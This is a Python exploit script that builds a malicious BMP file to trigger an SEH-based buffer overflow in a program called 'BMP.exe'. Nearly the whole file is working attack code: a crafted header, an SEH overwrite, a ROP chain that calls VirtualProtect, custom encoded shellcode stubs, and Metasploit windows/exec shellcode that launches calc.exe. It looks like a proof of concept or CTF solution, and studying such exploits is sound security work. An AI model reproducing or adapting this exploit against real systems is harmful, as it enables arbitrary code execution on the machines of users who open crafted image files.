from setuid0 import *
import time
import os
import sys

hp = p16

with file(desktop + 'share/payload.bmp', 'wb') as f:
    header = ''
    header += 'BM'
    header = header.ljust(14, '\x00')
    f.write(header)

   header2 = ''

   # biBitCount
    header2 = header2.ljust(0xe, '\x00')
    header2 += hp(8)

   # biSizeImage
    header2 = header2.ljust(0x14, '\x00')
    header2 += p(0x1000000)

   payload = ''
    payload += p(0x0041415c) * (0x580 / 4)
    # SEH
    payload += 'BBBB'
    payload += p(0x004040CA)  # add     esp, 9D4h

   payload += p(0x004040D0) * 0x100

   rop_gadgets = [
        0x0048fd92,  # POP EAX # RETN [BMP.exe]
        0x00552278,  # ptr to &VirtualProtect() [IAT BMP.exe]
        0x0047009b,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BMP.exe]
        0x004cf8fc,  # XCHG EAX,ESI # RETN [BMP.exe]
        0x0052f598,  # POP EBP # RETN [BMP.exe]
        0x0044e1fb,  # & push esp # ret  [BMP.exe]
        0x0048cd0f,  # POP EBX # RETN [BMP.exe]
        0x00000201,  # 0x00000201-> ebx
        0x005379c3,  # POP EDX # RETN [BMP.exe]
        0x00000040,  # 0x00000040-> edx
        0x0040178f,  # POP ECX # RETN [BMP.exe]
        0x0059f9f4,  # &Writable location [BMP.exe]
        0x0052b4e2,  # POP EDI # RETN [BMP.exe]
        0x0044aecf,  # RETN (ROP NOP) [BMP.exe]
        0x00458f09,  # POP EAX # RETN [BMP.exe]
        0x000002eb,  # jmp
        0x00548e8f,  # PUSHAD # RETN [BMP.exe]
    ]
    for one in rop_gadgets:
        payload += p(one)

   shellcode = asm("""
    BITS 32
    push esp
    pop eax
    add [eax], al
    push esp
    pop ebx
    add [eax], al
    lea edi, [esp+0x100]
    add [ebx], al
    push edi
    pop esi
    add [ebx], al
    push edi
    push edi
    add [ebx], al
    mov ecx, 0xff
    a:
    lodsd
    add [ebx], al
    stosw
    add [ebx], al
    loop a
    add [ebx], al
    ret
    ret
    db 0x00
    """)
    payload += shellcode
    payload += '\x90' * 0x100

   shellcode2 = asm("""
    mov eax, 0x404D26
    push 0x880
    call eax
    add eax, 0x3818
    mov edi, esp
    and edi, 0xfffff000
    mov esi, eax
    mov eax, edi
    mov ecx, 0x800
    rep movsb
    jmp eax
    """)
    for i in xrange(0, len(shellcode2), 2):
        payload += shellcode2[i:i+2] + '\x90\x90'
    print disasm(shellcode2)

   payload = payload.ljust(0x2000, '\x90')

   biClr = ''
    for i in xrange(0, len(payload), 4):
        biClr += payload[i:i+3]
        biClr += 'M'

   # biClrUsed
    header2 = header2.ljust(0x20, '\x00')
    header2 += hp(len(biClr))
    header2 = header2.ljust(40, '\x00')
    f.write(header2)
    f.write(biClr)

   # windows/exec - 193 bytes
    # http://www.metasploit.com
    # VERBOSE=false, PrependMigrate=false, EXITFUNC=process,
    # CMD=calc.exe
    buf = ""
    buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
    buf += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
    buf += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
    buf += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
    buf += "\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
    final_shellcode = buf
    biImage = final_shellcode.rjust(0x1000, '\x90')
    f.write(biImage)